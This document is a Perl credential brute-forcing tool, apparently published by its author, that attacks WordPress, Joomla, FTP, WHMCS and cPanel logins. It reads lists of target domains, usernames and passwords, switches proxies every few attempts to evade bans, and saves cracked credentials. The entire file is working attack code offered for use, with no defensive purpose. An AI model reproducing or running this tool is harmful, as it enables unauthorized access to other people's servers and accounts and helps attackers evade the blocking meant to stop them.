#!/usr/bin/perl
#
#facebook: www.facebook.com/kuroy0x
#Brute WP-JOomla-FTP-SSH-WHMCS-cPanel + Proxy Loader
#[Beta] (Slow Speed) | it's not real version ;)
#public ;)


use Net::FTP;
use LWP::UserAgent;
use WWW::Mechanize;
use MIME::Base64;
if(@ARGV != 5)
{
	die(&useage."\n");
}

$option = lc($ARGV[0]);
$domainsListFile = $ARGV[1];
$usrListFile = $ARGV[2];
$passListFile = $ARGV[3];
$prxyListFile = $ARGV[4];

####Load Files###
#get all users
$/ = "\n";
open(FP,"$usrListFile") || die("sry i can't open $usrListFile file.\n");
@usrList = <FP>;
chomp(@usrList);
close(FP); 
#get all passwords
open(FP,"$passListFile") || die("sry i can't open $passListFile file.\n");
@passList = <FP>;
chomp(@passList);
close(FP); 
#get all proxies
open(FP,"$prxyListFile") || die("sry i can't open $prxyListFile file.\n");
@prxyList = <FP>;
chomp(@prxyList);
close(FP);
#get all domains
open(FP,"$domainsListFile") || die("sry i can't open $domainsListFile file.\n");
@domainsList = <FP>;
chomp(@domainsList);
close(FP);

####End OF Load Files###	

&check_option();


#&check_option;


sub useage
{
	print   "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n".
            "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n".
	        "useage : perl brute.pl option domainslist userlist passlist proxylist\n".
			"EX :perl brute.pl -wp targest.txt users.text passes.text proxies.text\n".
            "-----------------------------------------------------------------\n".
            "-----------------------------------------------------------------\n".
			"Options  \n".
			"\tWordPress [-wp]\n".
			"\tJoomla [-joom]\n".
			"\tFTP [-ftp]\n".
			"\tSSH [-ssh]\n".
			#"\tSMTP [-smtp]\n".
			"\tWHMCS [-whm]\n".
			"\tCpanel [-cp]\n";
}

sub check_option
{
	if($option eq "-wp")
	{
		&brute_wp();
	}elsif($option eq "-joom")
	{
		&brute_joomla();
	}elsif($option eq "-ftp")
	{
		&brute_ftp();
	}elsif($option eq "-ssh")
	{
		print "ssh\n";
	}elsif($option eq "-smtp")
	{
		print "smtp\n";
	}elsif($option eq "-whm")
	{
		&brute_whmcs();
	}elsif($option eq "-cp")
	{
		&brute_cpanel();
	}else
	{
		die(&useage."\n");
	}

}

sub brute_ftp
{
	

	foreach $domain(@domainsList)
	{
		my $host = $domainsList[0];
		
		my $counter = 0 ; #proxy should be change
		my $firewall = $prxyList[0];
	
		#connect to ftp server
		my $ftp = Net::FTP->new($host,Firewall => $firewall, Passive => 1) || die ("can't connect $! \n");
		#load all usernames 
		foreach $user(@usrList)
		{
			#load all passwords 
			foreach $pass(@passList)
			{
				$ftp->pasv();
				++$counter;       
				syswrite STDOUT,"Check $user:$pass\n";
					#check counter
					if($counter % 5 == 0 || !$ftp)
					{
					   shift(@prxyList);
					   $firewall = $prxyList[0];
					   $ftp = Net::FTP->new($host,Firewall => $firewall,Passive => 1) || die ("can't connect $! \n");
					   syswrite STDOUT,"#Proxy change to $firewall \n";
					   
					}
					#check login
			if($ftp->login($user,$pass))
					{
					    print "hahaha Cracked ;)) > $user:$pass\n";
					    open(FP,">Ftp-Cracked-$host.txt") || die("sry i can't to write to Ftp-Cracked-$host.txt\n");
						print FP "$user:$pass\n";
						close(FP);
						$ftp->quit || die "Error closing ftp connection .\n";
						goto(ENDPROG);
					}		
					
		       
	
			     
			}
	
		}
		ENDPROG : print "Finished.\n";

	}
	

	
}



sub brute_wp
{
	

    #include admin path and check http
    foreach $domain(@domainsList)
    {
	$domain .= "/wp-login.php";
	$domain = "http://".$domain if ($domain !~ /^http:\/\//);
	$counter = 0 ;
        syswrite STDOUT,">Domain : $domain\n";
	    
        #load all usernames 
	foreach $user(@usrList)
	{
		#load all passworsd
		foreach $pass(@passList)
		{
                        
			#remover first element of proxy list if counter % 5 is true
			shift(@prxyList) if ($counter % 5 == 0);
			$proxy = $prxyList[0];
			#load proxy
			$proxy = "http://".$proxy if($prxyList[0] !~ /^http:\/\//);
			my $resp = WWW::Mechanize->new();
			$resp->proxy(['http'],$proxy);
			$resp->get($domain);

			$resp->submit_form(
			    fields => {
			
					'log' => $user,
					'pwd' => $pass,
					'wp-submit' => 'Log in',
					
			    }
			);
		     
			if($resp->content() =~ /logout/i){
			    print "hahaha Cracked ;)) > \n";
			    goto(EXT);
			}


			++$counter;
	      }
	}
	EXT : print "Finished .";
	
	

	
    }
    

    
}

sub brute_joomla
{
	foreach $domain(@domainsList)
	{
		#include admin path and check http
		$domain .= "/administrator/index.php";
		$domain = "http://".$domain if ($domain !~ /^http:\/\//);
		$counter = 0 ;
	    #load all usernames    
	    foreach $user(@usrList)
	    {
		    #load all passworsd
		    foreach $pass(@passList)
		    {
			    #remover first element of proxy list if counter % 5 is true
			    shift(@prxyList) if ($counter % 5 == 0);
			    $proxy = $prxyList[0];
			    #load proxy
			    $proxy = "http://".$proxy if($prxyList[0] !~ /^http:\/\//);
			    my $resp = WWW::Mechanize->new();
			    $resp->proxy(['http'],$proxy);
			    $resp->get($domain);
			    #get security token for login
			    if($resp->content() =~ /([0-9a-fA-F]{32})/){
				$secTok = $1;
			    } else {
				die("cant get security token.\n");
			    }
			    $resp->submit_form(
				fields => {
				    username => $user,
				    passwd  => $pass,
				    task  => 'login',
				    $secTok  => '1',
				}
			    );
			 
			    if($resp->content() =~ /logout/i){
				print "hahaha Cracked ;)) > $user:$pass\n";
				goto(EXT);
			    }
			    ++$counter;
		    }
	    }
	    
	    EXT : print "Finished.\n";	

	}
	

}



sub brute_cpanel
{
	foreach $domain(@domainsList)
	{
		#get host ip
		$domain =~ s/^http:\/\///;
		$ip = gethostbyname($domain);
		$proto = getprotobyname("tcp");
		$port = 2082;
		$packAddr = pack("Sna4x8",2,$port,$ip);
		$counter = 0 ;
		#load all usernames    
		foreach $user(@usrList)
		{
			#load all passworsd
			foreach $pass(@passList)
			{
	
				$data = encode_base64("$user:$pass");
				$header = "GET / HTTP/1.1\n" .
					  "Authorization: Basic $data\n".
					  "Connection: Close\n\n";
				socket(TCP_SOCK,2,1,$proto);
				connect(TCP_SOCK,$packAddr);
				send(TCP_SOCK,"$header", 0);
				recv(TCP_SOCK,$result,20,0);
				if($result =~ /301/)
				{
				    print "hahaha Cracked ;)) > \n";
				    goto(EXT);
				}
	
			}
		}
		
		EXT : print "Finished.\n";
			
		
	}
	

}


sub brute_whmcs
{
	foreach $domain(@domainsList)
	{

		$domain =~ s/^http:\/\///;	
		$ip = gethostbyname($domain);
		$proto = getprotobyname("tcp");
		$port = 80;
		$packAddr = pack("Sna4x8",2,$port,$ip);
		foreach $user(@usrList)
		{
			#load all passworsd
			foreach $pass(@passList)
			{
				syswrite STDOUT,"Check $user:$pass\n";
				$data = "username=$user&password=$pass&language=";
				$dataLen = length($data);
				$header = "POST /admin/dologin.php HTTP/1.1\r\n".
				"Host: $domain\r\n".
				"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0\r\n".
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
				"Referer: http://$domain/admin/login.php\r\n".
				"Content-Type: application/x-www-form-urlencoded\r\n".
				"Content-Length: $dataLen\r\n\r\n".
				"$data\r\n";
				#"Connection: close\r\n\r\n";
				socket(TCP_SOCK,2,1,$proto);
				#bind(TCP_SOCK,$packCAddr) || die ("cant bind $!\n");
				connect(TCP_SOCK,$packAddr);
				send(TCP_SOCK,"$header", 0);
				recv(TCP_SOCK,$result,10240,0);
				
				print $result;
				if($result =~ /Location: index\.php/)
				{
				    print "hahaha Cracked ;)) > \n";
				    goto(EXT);
				}elsif($result =~ /Location: http:\/\/demo\.whmcs\.com\/banned\.php\//)
				
				{
				    print "Ip Banned .\n";
				}
			}
		}
		
		EXT : print "Finished.\n";

	}
	


}